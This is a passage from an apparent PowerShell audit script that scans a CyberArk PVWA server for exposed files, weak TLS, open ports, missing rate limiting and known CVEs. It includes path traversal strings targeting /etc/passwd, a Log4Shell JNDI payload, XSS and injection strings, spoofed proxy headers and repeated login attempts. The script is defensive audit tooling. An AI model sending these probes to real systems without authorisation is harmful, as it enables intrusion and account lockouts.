        # Error pages that might leak info
        @{ Path = "/PasswordVault/error.aspx"; Desc = "Error page" },
        @{ Path = "/PasswordVault/errorpage.htm"; Desc = "Error page HTML" },
        # Admin/debug pages
        @{ Path = "/PasswordVault/admin/"; Desc = "Admin directory" },
        @{ Path = "/PasswordVault/debug/"; Desc = "Debug directory" },
        @{ Path = "/PasswordVault/test/"; Desc = "Test directory" },
        @{ Path = "/PasswordVault/trace.axd"; Desc = "ASP.NET Trace" },
        @{ Path = "/PasswordVault/elmah.axd"; Desc = "ELMAH Error Log" }
    )

    foreach ($file in $sensitiveFiles) {
        try {
            $response = Invoke-WebRequest -Uri "$PVWA$($file.Path)" -Method GET -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue

            if ($response.StatusCode -eq 200) {
                # Check content length to ensure it's not an error page
                if ($response.Content.Length -gt 0) {
                    $severity = "High"
                    if ($file.Path -match "\.(log|txt)$") { $severity = "Medium" }
                    if ($file.Path -match "\.(bak|config|ini|xml)$") { $severity = "Critical" }

                    Add-Finding -Category "Exposed Files" `
                        -CISControl "BB7" `
                        -Finding "Sensitive file accessible" `
                        -Resource $file.Path `
                        -CurrentValue "$($file.Desc) - HTTP 200 ($($response.Content.Length) bytes)" `
                        -ExpectedValue "File not accessible" `
                        -Recommendation "Remove or restrict access to $($file.Desc)" `
                        -Severity $severity
                }
            }
        }
        catch {
            # Expected - file should not be accessible
        }
    }
}

function Test-DirectoryListing {
    Write-AuditLog "Checking for directory listing (Blackbox)..." -Level Info

    $directories = @(
        "/PasswordVault/",
        "/PasswordVault/WebServices/",
        "/PasswordVault/Services/",
        "/PasswordVault/v10/",
        "/PasswordVault/api/",
        "/PasswordVault/Scripts/",
        "/PasswordVault/Images/",
        "/PasswordVault/Content/",
        "/PasswordVault/bin/"
    )

    foreach ($dir in $directories) {
        try {
            $response = Invoke-WebRequest -Uri "$PVWA$dir" -Method GET -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue

            # Check for directory listing indicators
            if ($response.Content -match "Index of|Directory listing|Parent Directory|\[To Parent Directory\]|<title>.*listing.*</title>") {
                Add-Finding -Category "Directory Listing" `
                    -CISControl "BB8" `
                    -Finding "Directory listing enabled" `
                    -Resource $dir `
                    -CurrentValue "Directory contents visible" `
                    -ExpectedValue "Directory listing disabled" `
                    -Recommendation "Disable directory browsing in IIS" `
                    -Severity "Medium"
            }
        }
        catch { }
    }
}

function Test-CertificateIssues {
    Write-AuditLog "Checking SSL/TLS certificate issues (Blackbox)..." -Level Info

    try {
        $uri = [System.Uri]$PVWA

        # Custom callback to capture certificate
        $certCallback = {
            param($certSender, $cert, $chain, $errors)
            $script:ServerCert = $cert
            $script:CertErrors = $errors
            $script:CertChain = $chain
            return $true  # Accept for testing
        }

        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $certCallback

        # Make request to get certificate
        $request = [System.Net.HttpWebRequest]::Create($PVWA)
        $request.Method = "HEAD"
        $request.Timeout = 10000

        try {
            $response = $request.GetResponse()
            $response.Close()
        }
        catch { }

        # Reset callback
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null

        if ($script:ServerCert) {
            $cert = $script:ServerCert
            $now = Get-Date

            # Check expiration
            $expiryDate = [DateTime]::Parse($cert.GetExpirationDateString())
            $daysToExpiry = ($expiryDate - $now).Days

            if ($daysToExpiry -lt 0) {
                Add-Finding -Category "Certificate" `
                    -CISControl "BB9" `
                    -Finding "SSL certificate has expired" `
                    -Resource "PVWA Certificate" `
                    -CurrentValue "Expired $([Math]::Abs($daysToExpiry)) days ago" `
                    -ExpectedValue "Valid certificate" `
                    -Recommendation "Renew SSL certificate immediately" `
                    -Severity "Critical"
            }
            elseif ($daysToExpiry -lt 30) {
                Add-Finding -Category "Certificate" `
                    -CISControl "BB9" `
                    -Finding "SSL certificate expiring soon" `
                    -Resource "PVWA Certificate" `
                    -CurrentValue "Expires in $daysToExpiry days" `
                    -ExpectedValue "More than 30 days validity" `
                    -Recommendation "Plan certificate renewal" `
                    -Severity "Medium"
            }

            # Check for self-signed
            if ($cert.Subject -eq $cert.Issuer) {
                Add-Finding -Category "Certificate" `
                    -CISControl "BB9" `
                    -Finding "Self-signed certificate in use" `
                    -Resource "PVWA Certificate" `
                    -CurrentValue "Subject equals Issuer" `
                    -ExpectedValue "CA-signed certificate" `
                    -Recommendation "Replace with certificate from trusted CA" `
                    -Severity "Medium"
            }

            # Check hostname mismatch
            $certCN = if ($cert.Subject -match "CN=([^,]+)") { $matches[1] } else { "" }
            if ($certCN -and $certCN -ne $uri.Host -and $certCN -notmatch "\*") {
                Add-Finding -Category "Certificate" `
                    -CISControl "BB9" `
                    -Finding "Certificate hostname mismatch" `
                    -Resource "PVWA Certificate" `
                    -CurrentValue "CN=$certCN, Host=$($uri.Host)" `
                    -ExpectedValue "Matching hostname" `
                    -Recommendation "Obtain certificate for correct hostname" `
                    -Severity "High"
            }

            # Check key size
            $keySize = $cert.PublicKey.Key.KeySize
            if ($keySize -lt 2048) {
                Add-Finding -Category "Certificate" `
                    -CISControl "BB9" `
                    -Finding "Weak certificate key size" `
                    -Resource "PVWA Certificate" `
                    -CurrentValue "$keySize bits" `
                    -ExpectedValue "2048 bits or higher" `
                    -Recommendation "Replace with certificate using 2048+ bit key" `
                    -Severity "High"
            }

            # Check signature algorithm
            $sigAlgo = $cert.SignatureAlgorithm.FriendlyName
            if ($sigAlgo -match "SHA1|MD5") {
                Add-Finding -Category "Certificate" `
                    -CISControl "BB9" `
                    -Finding "Weak certificate signature algorithm" `
                    -Resource "PVWA Certificate" `
                    -CurrentValue $sigAlgo `
                    -ExpectedValue "SHA256 or stronger" `
                    -Recommendation "Replace certificate using SHA256 or stronger" `
                    -Severity "High"
            }
        }
    }
    catch {
        Add-SkippedCheck -Category "Certificate" -CISControl "BB9" `
            -CheckName "SSL/TLS Certificate Check" `
            -Reason "Could not check certificate: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-RateLimiting {
    Write-AuditLog "Checking for rate limiting (Blackbox)..." -Level Info

    # Skip in OPSEC mode - this test is noisy and could trigger alerts/lockouts
    if ($script:OPSECEnabled -or $script:SkipRateLimitTests) {
        Add-SkippedCheck -Category "Rate Limiting" -CISControl "BB10" `
            -CheckName "Rate Limiting Check" `
            -Reason "Skipped in OPSEC mode - test may trigger account lockouts or security alerts" `
            -Type "Skipped"
        return
    }

    $loginEndpoint = "$PVWA/PasswordVault/api/Auth/CyberArk/Logon"
    $successCount = 0
    # Reduced from 20 to 10 attempts to minimize lockout risk
    $testCount = 10

    Write-AuditLog "WARNING: Rate limit test will make $testCount rapid login attempts. This may trigger security alerts." -Level Warning

    # Make rapid requests
    for ($i = 0; $i -lt $testCount; $i++) {
        try {
            $body = @{
                username = "ratelimit_test_$i"
                password = "TestPassword123!"
            } | ConvertTo-Json

            $response = Invoke-OPSECWebRequest -Uri $loginEndpoint -Method POST -Body $body -ContentType "application/json" -TimeoutSec 5
            $successCount++
        }
        catch {
            if ($_.Exception.Response.StatusCode -eq 429) {
                # Rate limiting is working
                Add-Finding -Category "Rate Limiting" `
                    -CISControl "BB10" `
                    -Finding "Rate limiting is configured" `
                    -Resource "Login Endpoint" `
                    -CurrentValue "HTTP 429 after $i attempts" `
                    -ExpectedValue "Rate limiting active" `
                    -Recommendation "N/A - Rate limiting is working" `
                    -Severity "Info" `
                    -Status "Pass"
                return
            }
            $successCount++
        }
    }

    # If we got here without 429, rate limiting may not be configured
    if ($successCount -eq $testCount) {
        Add-Finding -Category "Rate Limiting" `
            -CISControl "BB10" `
            -Finding "No rate limiting detected on login endpoint" `
            -Resource "Login Endpoint" `
            -CurrentValue "$testCount requests without rate limit" `
            -ExpectedValue "Rate limiting after 5-10 attempts" `
            -Recommendation "Implement rate limiting to prevent brute force attacks" `
            -Severity "High"
    }
}

function Test-KnownVulnerabilities {
    Write-AuditLog "Checking for known vulnerability indicators (Blackbox)..." -Level Info

    # Check for CVE-2021-31796 related endpoints (PVWA SSRF)
    $ssrfEndpoints = @(
        "/PasswordVault/api/accounts/bulk_upload",
        "/PasswordVault/api/bulkaction"
    )

    foreach ($endpoint in $ssrfEndpoints) {
        try {
            $response = Invoke-WebRequest -Uri "$PVWA$endpoint" -Method POST -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue

            if ($response.StatusCode -ne 404) {
                Add-Finding -Category "Known Vulnerabilities" `
                    -CISControl "BB11" `
                    -Finding "Potentially vulnerable endpoint accessible" `
                    -Resource $endpoint `
                    -CurrentValue "Endpoint responds (check CVE-2021-31796)" `
                    -ExpectedValue "Endpoint patched or removed" `
                    -Recommendation "Verify CyberArk version and apply security patches" `
                    -Severity "High"
            }
        }
        catch { }
    }

    # Check for older API versions that may have vulnerabilities
    $oldApiVersions = @(
        "/PasswordVault/WebServices/PIMServices.svc",
        "/PasswordVault/api/v1/",
        "/PasswordVault/api/v9/"
    )

    foreach ($api in $oldApiVersions) {
        try {
            $response = Invoke-WebRequest -Uri "$PVWA$api" -Method GET -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue

            if ($response.StatusCode -eq 200) {
                Add-Finding -Category "Known Vulnerabilities" `
                    -CISControl "BB11" `
                    -Finding "Legacy API version accessible" `
                    -Resource $api `
                    -CurrentValue "HTTP 200" `
                    -ExpectedValue "Disabled or removed" `
                    -Recommendation "Disable legacy API endpoints" `
                    -Severity "Medium"
            }
        }
        catch { }
    }
}

#======================================================================
# NETWORK SECURITY CHECKS
#======================================================================

function Test-PortScan {
    Write-AuditLog "Performing port scan on CyberArk infrastructure..." -Level Info

    $uri = [System.Uri]$PVWA
    $targetHost = $uri.Host

    # CyberArk-specific ports to check
    $cyberArkPorts = @(
        @{ Port = 443;   Service = "PVWA HTTPS"; Expected = $true; Severity = "Info" },
        @{ Port = 80;    Service = "HTTP (should be disabled)"; Expected = $false; Severity = "High" },
        @{ Port = 1858;  Service = "Vault Protocol"; Expected = $false; Severity = "Critical" },
        @{ Port = 1859;  Service = "Vault DR"; Expected = $false; Severity = "High" },
        @{ Port = 22;    Service = "SSH"; Expected = $false; Severity = "Medium" },
        @{ Port = 23;    Service = "Telnet"; Expected = $false; Severity = "Critical" },
        @{ Port = 3389;  Service = "RDP"; Expected = $false; Severity = "High" },
        @{ Port = 5985;  Service = "WinRM HTTP"; Expected = $false; Severity = "High" },
        @{ Port = 5986;  Service = "WinRM HTTPS"; Expected = $false; Severity = "Medium" },
        @{ Port = 445;   Service = "SMB"; Expected = $false; Severity = "Critical" },
        @{ Port = 139;   Service = "NetBIOS"; Expected = $false; Severity = "High" },
        @{ Port = 135;   Service = "RPC"; Expected = $false; Severity = "High" },
        @{ Port = 1433;  Service = "MSSQL"; Expected = $false; Severity = "Critical" },
        @{ Port = 1434;  Service = "MSSQL Browser"; Expected = $false; Severity = "High" },
        @{ Port = 3306;  Service = "MySQL"; Expected = $false; Severity = "Critical" },
        @{ Port = 5432;  Service = "PostgreSQL"; Expected = $false; Severity = "Critical" },
        @{ Port = 1521;  Service = "Oracle"; Expected = $false; Severity = "Critical" },
        @{ Port = 161;   Service = "SNMP"; Expected = $false; Severity = "High" },
        @{ Port = 162;   Service = "SNMP Trap"; Expected = $false; Severity = "High" },
        @{ Port = 25;    Service = "SMTP"; Expected = $false; Severity = "Medium" },
        @{ Port = 8080;  Service = "HTTP Alternate"; Expected = $false; Severity = "Medium" },
        @{ Port = 8443;  Service = "HTTPS Alternate"; Expected = $false; Severity = "Low" },
        @{ Port = 9443;  Service = "PSM Gateway"; Expected = $false; Severity = "Medium" },
        @{ Port = 636;   Service = "LDAPS"; Expected = $false; Severity = "Low" },
        @{ Port = 389;   Service = "LDAP (unsecure)"; Expected = $false; Severity = "High" },
        @{ Port = 53;    Service = "DNS"; Expected = $false; Severity = "Low" },
        @{ Port = 21;    Service = "FTP"; Expected = $false; Severity = "Critical" },
        @{ Port = 69;    Service = "TFTP"; Expected = $false; Severity = "Critical" }
    )

    foreach ($portInfo in $cyberArkPorts) {
        try {
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($targetHost, $portInfo.Port, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne(1000, $false)

            if ($wait -and $tcpClient.Connected) {
                $tcpClient.EndConnect($asyncResult)
                $tcpClient.Close()

                if (-not $portInfo.Expected) {
                    $cisControl = switch ($portInfo.Port) {
                        1858 { "NET2" }
                        { $_ -in @(3389, 22, 23) } { "NET5" }
                        { $_ -in @(445, 139, 135) } { "NET4" }
                        { $_ -in @(1433, 1434, 3306, 5432, 1521) } { "NET6" }
                        default { "NET1" }
                    }

                    Add-Finding -Category "Network Security" `
                        -CISControl $cisControl `
                        -Finding "Exposed port detected" `
                        -Resource "$targetHost`:$($portInfo.Port)" `
                        -CurrentValue "$($portInfo.Service) - OPEN" `
                        -ExpectedValue "Port closed or filtered" `
                        -Recommendation "Restrict access to $($portInfo.Service) port through firewall" `
                        -Severity $portInfo.Severity
                }
                else {
                    Add-Finding -Category "Network Security" `
                        -CISControl "NET1" `
                        -Finding "Expected service port open" `
                        -Resource "$targetHost`:$($portInfo.Port)" `
                        -CurrentValue "$($portInfo.Service) - OPEN" `
                        -ExpectedValue "Port open (expected)" `
                        -Recommendation "N/A - Expected service" `
                        -Severity "Info" `
                        -Status "Pass"
                }
            }
            else {
                $tcpClient.Close()
            }
        }
        catch {
            # Port closed or filtered - expected for most ports
        }
    }
}

function Test-VaultPortSecurity {
    Write-AuditLog "Checking Vault port (1858) security..." -Level Info

    $uri = [System.Uri]$PVWA
    $targetHost = $uri.Host

    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $asyncResult = $tcpClient.BeginConnect($targetHost, 1858, $null, $null)
        $wait = $asyncResult.AsyncWaitHandle.WaitOne(3000, $false)

        if ($wait -and $tcpClient.Connected) {
            $tcpClient.EndConnect($asyncResult)

            # Try to get banner/response
            $stream = $tcpClient.GetStream()
            $stream.ReadTimeout = 2000
            $stream.WriteTimeout = 2000

            # Send a probe
            $bytes = [System.Text.Encoding]::ASCII.GetBytes("PROBE`r`n")
            try {
                $stream.Write($bytes, 0, $bytes.Length)
                $buffer = New-Object byte[] 1024
                $bytesRead = $stream.Read($buffer, 0, $buffer.Length)

                if ($bytesRead -gt 0) {
                    $response = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)

                    Add-Finding -Category "Vault Security" `
                        -CISControl "NET2" `
                        -Finding "Vault port responds to probes" `
                        -Resource "$targetHost`:1858" `
                        -CurrentValue "Vault responds to unauthenticated probes" `
                        -ExpectedValue "No response or connection refused" `
                        -Recommendation "Ensure Vault is only accessible from authorized components" `
                        -Severity "High"
                }
            }
            catch { }

            $tcpClient.Close()

            Add-Finding -Category "Vault Security" `
                -CISControl "NET2" `
                -Finding "Vault port (1858) accessible from scan source" `
                -Resource "$targetHost`:1858" `
                -CurrentValue "Port 1858 OPEN" `
                -ExpectedValue "Vault port restricted to CPM/PSM/PVWA only" `
                -Recommendation "Restrict Vault port access through network segmentation" `
                -Severity "Critical"
        }
    }
    catch { }
}

function Test-CipherSuites {
    Write-AuditLog "Enumerating SSL/TLS cipher suites..." -Level Info

    $uri = [System.Uri]$PVWA
    $targetHost = $uri.Host
    $port = if ($uri.Port -gt 0) { $uri.Port } else { 443 }

    # Weak cipher patterns
    $weakCiphers = @(
        "RC4", "DES", "3DES", "MD5", "NULL", "EXPORT", "ANON", "ADH", "AECDH"
    )

    $weakProtocols = @(
        [System.Security.Authentication.SslProtocols]::Ssl2,
        [System.Security.Authentication.SslProtocols]::Ssl3,
        [System.Security.Authentication.SslProtocols]::Tls,  # TLS 1.0
        [System.Security.Authentication.SslProtocols]::Tls11
    )

    foreach ($protocol in $weakProtocols) {
        try {
            $tcpClient = New-Object System.Net.Sockets.TcpClient($targetHost, $port)
            $sslStream = New-Object System.Net.Security.SslStream($tcpClient.GetStream(), $false, { $true })

            $sslStream.AuthenticateAsClient($targetHost, $null, $protocol, $false)

            $protocolName = switch ($protocol) {
                ([System.Security.Authentication.SslProtocols]::Ssl2) { "SSLv2" }
                ([System.Security.Authentication.SslProtocols]::Ssl3) { "SSLv3" }
                ([System.Security.Authentication.SslProtocols]::Tls) { "TLS 1.0" }
                ([System.Security.Authentication.SslProtocols]::Tls11) { "TLS 1.1" }
            }

            Add-Finding -Category "TLS Security" `
                -CISControl "TLS2" `
                -Finding "Weak TLS/SSL protocol supported" `
                -Resource "PVWA TLS Configuration" `
                -CurrentValue "$protocolName enabled" `
                -ExpectedValue "Only TLS 1.2/1.3" `
                -Recommendation "Disable $protocolName in IIS and Windows registry" `
                -Severity "High"

            $sslStream.Close()
            $tcpClient.Close()
        }
        catch {
            # Protocol not supported - good
        }
    }

    # Check TLS 1.2 and get cipher info
    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient($targetHost, $port)
        $sslStream = New-Object System.Net.Security.SslStream($tcpClient.GetStream(), $false, { $true })
        $sslStream.AuthenticateAsClient($targetHost)

        $cipher = $sslStream.CipherAlgorithm.ToString()
        $keyExchange = $sslStream.KeyExchangeAlgorithm.ToString()
        $hash = $sslStream.HashAlgorithm.ToString()
        $cipherStrength = $sslStream.CipherStrength

        # Check for weak ciphers
        foreach ($weak in $weakCiphers) {
            if ($cipher -match $weak -or $keyExchange -match $weak -or $hash -match $weak) {
                Add-Finding -Category "TLS Security" `
                    -CISControl "TLS1" `
                    -Finding "Weak cipher component detected" `
                    -Resource "PVWA TLS Configuration" `
                    -CurrentValue "Cipher: $cipher, KeyEx: $keyExchange, Hash: $hash" `
                    -ExpectedValue "Strong ciphers only (AES-GCM, ECDHE, SHA256+)" `
                    -Recommendation "Configure IIS to use only strong cipher suites" `
                    -Severity "High"
                break
            }
        }

        # Check cipher strength
        if ($cipherStrength -lt 128) {
            Add-Finding -Category "TLS Security" `
                -CISControl "TLS1" `
                -Finding "Weak cipher key strength" `
                -Resource "PVWA TLS Configuration" `
                -CurrentValue "$cipherStrength bits" `
                -ExpectedValue "128 bits minimum (256 recommended)" `
                -Recommendation "Configure stronger cipher suites" `
                -Severity "High"
        }

        $sslStream.Close()
        $tcpClient.Close()
    }
    catch {
        Add-SkippedCheck -Category "TLS Security" -CISControl "TLS1" `
            -CheckName "Cipher Suite Enumeration" `
            -Reason "Could not enumerate cipher suites: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-DNSSecurity {
    Write-AuditLog "Checking DNS security configuration..." -Level Info

    $uri = [System.Uri]$PVWA
    $targetHost = $uri.Host

    try {
        # Check for DNS rebinding protection
        $localAddresses = @("127.0.0.1", "localhost", "0.0.0.0", "::1")
        $internalRanges = @("10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.")

        $dnsResult = [System.Net.Dns]::GetHostAddresses($targetHost)

        foreach ($addr in $dnsResult) {
            $ipStr = $addr.ToString()

            # Check if resolves to localhost (potential DNS rebinding setup)
            if ($localAddresses -contains $ipStr) {
                Add-Finding -Category "DNS Security" `
                    -CISControl "NET7" `
                    -Finding "PVWA hostname resolves to localhost" `
                    -Resource $targetHost `
                    -CurrentValue "Resolves to $ipStr" `
                    -ExpectedValue "Should resolve to actual server IP" `
                    -Recommendation "Verify DNS configuration - potential DNS rebinding issue" `
                    -Severity "High"
            }
        }

        # Check for multiple A records (load balancing detection)
        if ($dnsResult.Count -gt 1) {
            Add-Finding -Category "DNS Security" `
                -CISControl "NET7" `
                -Finding "Multiple DNS records detected (load balanced)" `
                -Resource $targetHost `
                -CurrentValue "$($dnsResult.Count) IP addresses" `
                -ExpectedValue "N/A - Informational" `
                -Recommendation "Ensure all endpoints are equally hardened" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-Finding -Category "DNS Security" `
            -CISControl "NET7" `
            -Finding "DNS resolution failed" `
            -Resource $targetHost `
            -CurrentValue "Resolution failed" `
            -ExpectedValue "Valid DNS resolution" `
            -Recommendation "Verify DNS configuration" `
            -Severity "Medium"
    }
}

#======================================================================
# ADVANCED CVE CHECKS
#======================================================================

function Test-CVE202131796 {
    Write-AuditLog "Checking for CVE-2021-31796 (SSRF vulnerability)..." -Level Info

    # CVE-2021-31796: Server-Side Request Forgery in PVWA
    $ssrfPayloads = @(
        @{ Path = "/PasswordVault/api/Accounts?search=http://127.0.0.1"; Desc = "SSRF via search parameter" },
        @{ Path = "/PasswordVault/api/Safes?search=http://localhost"; Desc = "SSRF via safe search" },
        @{ Path = "/PasswordVault/api/ComponentsMonitoringDetails?url=http://127.0.0.1"; Desc = "SSRF via component URL" }
    )

    foreach ($payload in $ssrfPayloads) {
        try {
            $stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
            $response = Invoke-WebRequest -Uri "$PVWA$($payload.Path)" -Method GET -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
            $stopwatch.Stop()

            # Check for timing differences that might indicate SSRF
            if ($stopwatch.ElapsedMilliseconds -gt 5000) {
                Add-Finding -Category "CVE Assessment" `
                    -CISControl "CVE1" `
                    -Finding "Potential CVE-2021-31796 (SSRF) vulnerability" `
                    -Resource $payload.Path `
                    -CurrentValue "Delayed response ($($stopwatch.ElapsedMilliseconds)ms)" `
                    -ExpectedValue "Immediate error response" `
                    -Recommendation "Apply CyberArk security patch for CVE-2021-31796" `
                    -Severity "Critical"
            }
        }
        catch { }
    }
}

function Test-CVE202222536 {
    Write-AuditLog "Checking for CVE-2022-22536 (Authentication Bypass patterns)..." -Level Info

    # Test for authentication bypass patterns
    $bypassHeaders = @(
        @{ Name = "X-Forwarded-For"; Value = "127.0.0.1" },
        @{ Name = "X-Originating-IP"; Value = "127.0.0.1" },
        @{ Name = "X-Remote-IP"; Value = "127.0.0.1" },
        @{ Name = "X-Remote-Addr"; Value = "127.0.0.1" },
        @{ Name = "X-Real-IP"; Value = "127.0.0.1" },
        @{ Name = "X-Forwarded-Host"; Value = "localhost" },
        @{ Name = "X-Custom-IP-Authorization"; Value = "127.0.0.1" }
    )

    foreach ($header in $bypassHeaders) {
        try {
            $headers = @{ $header.Name = $header.Value }
            $response = Invoke-WebRequest -Uri "$PVWA/PasswordVault/api/Users" -Method GET -Headers $headers -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue

            if ($response.StatusCode -eq 200) {
                Add-Finding -Category "CVE Assessment" `
                    -CISControl "CVE2" `
                    -Finding "Potential authentication bypass via header injection" `
                    -Resource "PVWA Authentication" `
                    -CurrentValue "Header $($header.Name) accepted" `
                    -ExpectedValue "Request rejected without valid auth" `
                    -Recommendation "Ensure proxy headers are not trusted for authentication" `
                    -Severity "Critical"
            }
        }
        catch { }
    }
}

function Test-CVE202343903 {
    Write-AuditLog "Checking for CVE-2023-43903 (XSS vulnerability patterns)..." -Level Info

    # XSS test payloads
    $xssPayloads = @(
        @{ Path = "/PasswordVault/?search=<script>alert(1)</script>"; Desc = "Reflected XSS via search" },
        @{ Path = "/PasswordVault/v10/logon?callback=<img/src=x/onerror=alert(1)>"; Desc = "XSS via callback" },
        @{ Path = "/PasswordVault/?returnUrl=javascript:alert(1)"; Desc = "XSS via returnUrl" },
        @{ Path = "/PasswordVault/api/auth?redirect=data:text/html,<script>alert(1)</script>"; Desc = "XSS via redirect" }
    )

    foreach ($payload in $xssPayloads) {
        try {
            $response = Invoke-WebRequest -Uri "$PVWA$($payload.Path)" -Method GET -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue

            # Check if payload is reflected in response
            if ($response.Content -match "<script>|onerror=|javascript:") {
                Add-Finding -Category "CVE Assessment" `
                    -CISControl "CVE3" `
                    -Finding "Potential XSS vulnerability (CVE-2023-43903 pattern)" `
                    -Resource $payload.Path `
                    -CurrentValue "XSS payload reflected in response" `
                    -ExpectedValue "Input properly sanitized" `
                    -Recommendation "Apply latest CyberArk security patches" `
                    -Severity "High"
            }
        }
        catch { }
    }
}

function Test-CVE202442340 {
    Write-AuditLog "Checking for CVE-2024-42340 (DOM XSS)..." -Level Info

    # Check for DOM-based XSS patterns
    $domXssEndpoints = @(
        "/PasswordVault/#/search?q=test",
        "/PasswordVault/#/accounts?filter=test",
        "/PasswordVault/v10/#/dashboard"
    )

    foreach ($endpoint in $domXssEndpoints) {
        try {
            $response = Invoke-WebRequest -Uri "$PVWA$endpoint" -Method GET -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue

            # Check for vulnerable JavaScript patterns
            if ($response.Content -match "innerHTML\s*=|document\.write\(|eval\(|\.html\(") {
                Add-Finding -Category "CVE Assessment" `
                    -CISControl "CVE5" `
                    -Finding "Potential DOM XSS vulnerability pattern" `
                    -Resource $endpoint `
                    -CurrentValue "Dangerous DOM manipulation detected" `
                    -ExpectedValue "Safe DOM handling" `
                    -Recommendation "Review JavaScript for DOM XSS patterns" `
                    -Severity "Medium"
            }
        }
        catch { }
    }
}

function Test-CVE202442339 {
    Write-AuditLog "Checking for CVE-2024-42339 (HTML Injection)..." -Level Info

    # HTML injection test
    $htmlPayloads = @(
        @{ Path = "/PasswordVault/api/auth?error=<h1>Injected</h1>"; Desc = "HTML via error param" },
        @{ Path = "/PasswordVault/?msg=<marquee>Test</marquee>"; Desc = "HTML via msg param" }
    )

    foreach ($payload in $htmlPayloads) {
        try {
            $response = Invoke-WebRequest -Uri "$PVWA$($payload.Path)" -Method GET -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue

            if ($response.Content -match "<h1>Injected</h1>|<marquee>") {
                Add-Finding -Category "CVE Assessment" `
                    -CISControl "CVE6" `
                    -Finding "HTML Injection vulnerability (CVE-2024-42339 pattern)" `
                    -Resource $payload.Path `
                    -CurrentValue "HTML content rendered" `
                    -ExpectedValue "HTML properly escaped" `
                    -Recommendation "Apply input validation and output encoding" `
                    -Severity "Medium"
            }
        }
        catch { }
    }
}

function Test-AdditionalCVEs {
    Write-AuditLog "Checking for additional known CyberArk CVEs..." -Level Info

    # CVE-2020-25508 - Path Traversal
    $pathTraversalPayloads = @(
        "/PasswordVault/../../../etc/passwd",
        "/PasswordVault/..%2f..%2f..%2fetc/passwd",
        "/PasswordVault/....//....//....//etc/passwd",
        "/PasswordVault/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/PasswordVault/..%252f..%252f..%252fetc/passwd"
    )

    foreach ($payload in $pathTraversalPayloads) {
        try {
            $response = Invoke-WebRequest -Uri "$PVWA$payload" -Method GET -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue

            if ($response.Content -match "root:|nobody:|daemon:") {
                Add-Finding -Category "CVE Assessment" `
                    -CISControl "BB11" `
                    -Finding "Path traversal vulnerability detected" `
                    -Resource $payload `
                    -CurrentValue "File content disclosed" `
                    -ExpectedValue "Path traversal blocked" `
                    -Recommendation "Apply security patches and input validation" `
                    -Severity "Critical"
            }
        }
        catch { }
    }

    # CVE-2021-44228 (Log4Shell) - Check if Java components exist
    $log4shellHeaders = @{
        "X-Api-Version" = '${jndi:ldap://log4shell-test.invalid/a}'
        "User-Agent" = '${jndi:ldap://log4shell-test.invalid/a}'
    }

    try {
        $response = Invoke-WebRequest -Uri "$PVWA/PasswordVault/api/auth" -Method GET -Headers $log4shellHeaders -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue

        # Note: Actual detection would require out-of-band callback
        Add-Finding -Category "CVE Assessment" `
            -CISControl "BB11" `
            -Finding "Log4Shell payload sent (manual verification needed)" `
            -Resource "PVWA API" `
            -CurrentValue "Test payload injected - verify no callback received" `
            -ExpectedValue "No Log4j vulnerability" `
            -Recommendation "Ensure all Java components are patched for CVE-2021-44228" `
            -Severity "Info" `
            -Status "Pass"
    }
    catch { }
}

#======================================================================
# 2025 CVE CHECKS
#======================================================================

function Test-CVE2025EPM {
    Write-AuditLog "Checking for 2025 EPM CVEs (CVE-2025-22270 through CVE-2025-22274)..." -Level Info

    # CVE-2025-22270 - HTML injection in role management (requires admin access)
    # CVE-2025-22271 - X-Forwarded-For spoofing
    $spoofHeaders = @{
        "X-Forwarded-For" = "127.0.0.1, 10.0.0.1"
        "X-Real-IP" = "192.168.1.1"
        "X-Client-IP" = "172.16.0.1"
    }

    try {
        $response = Invoke-WebRequest -Uri "$PVWA/PasswordVault/api/auth" -Method GET -Headers $spoofHeaders -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue

        # Check if the server trusts X-Forwarded-For headers
        Add-Finding -Category "CVE Assessment" `
            -CISControl "CVE8" `
            -Finding "X-Forwarded-For spoofing test (CVE-2025-22271 pattern)" `
            -Resource "PVWA API" `
            -CurrentValue "Headers sent - verify server doesn't trust untrusted proxies" `
            -ExpectedValue "X-Forwarded-For headers validated" `
            -Recommendation "Configure trusted proxy list and validate X-Forwarded-For headers" `
            -Severity "Info" `
            -Status "Pass"
    }
    catch { }

    # CVE-2025-22272 - XSS via modalDlgMsgInternal parameter
    $xssPayloads = @(
        "/PasswordVault/ModalDlgHandler.ashx?value=showReadonlyDlg&modalDlgMsgInternal=<script>alert(1)</script>",
        "/PasswordVault/ModalDlgHandler.ashx?value=showReadonlyDlg&modalDlgMsgInternal=%3Cscript%3Ealert(1)%3C/script%3E"
    )

    foreach ($payload in $xssPayloads) {
        try {
            $response = Invoke-WebRequest -Uri "$PVWA$payload" -Method GET -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue

            if ($response.Content -match "<script>alert\(1\)</script>" -and $response.Content -notmatch "Content-Security-Policy") {
                Add-Finding -Category "CVE Assessment" `
                    -CISControl "CVE9" `
